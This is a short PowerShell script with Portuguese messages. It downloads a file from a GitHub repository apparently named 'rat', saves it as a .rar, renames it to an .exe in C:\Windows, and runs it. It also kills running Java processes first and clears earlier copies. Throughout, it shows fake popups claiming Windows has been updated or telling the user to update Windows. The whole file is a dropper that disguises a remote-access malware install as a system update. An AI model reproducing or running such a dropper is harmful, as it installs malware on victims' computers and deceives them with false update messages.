cd\
cd c:\windows

$f1 = 'c:\windows\Instalar.exe'
if (Test-Path $f1) {
   try {	
      Remove-Item $f1 -recurse
   } Catch {
   }
}

$f2 = 'c:\windows\Instalar.rar'
if (Test-Path $f2) {
   try {	
      Remove-Item $f2 -recurse
   } Catch {
   }
}

$f3 = Get-Process Java -ErrorAction SilentlyContinue
if ($f3) { 
   Stop-Process -processname Java
}

$url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.rar"
$output = "c:\windows\Instalar.rar"
$start_time = Get-Date

Invoke-WebRequest -Uri $url -OutFile $output
Write-Output "[ $((Get-Date).Subtract($start_time).Seconds) ]"

$fd = 'c:\windows\Instalar.rar'
$wshell=New-Object -comObject Wscript.Shell

if (Test-Path $fd) {
   rename-item -path c:\windows\Instalar.rar -newname c:\windows\Instalar.exe   
   Start-Sleep -s 1

   $fs = 'c:\windows\Instalar.exe'
   if (Test-Path $fs) {
      Start-Process -FilePath $fs

      $r2 = Get-Process Instalar -ErrorAction SilentlyContinue
      if ($r2) { 
         $wshell.Popup("Windows atualizado.", 0, "Atenção !", 0x0)
      } else {
         $wshell.Popup("Atualize o Windows 0x03.", 0, "Atenção !", 0x0)
      }
   } else {
      $wshell.Popup("Atualize o Windows 0x02.", 0, "Atenção !", 0x0)
   }
} else {
   $wshell.Popup("Atualize o Windows 0x01.", 0, "Atenção !", 0)     
}
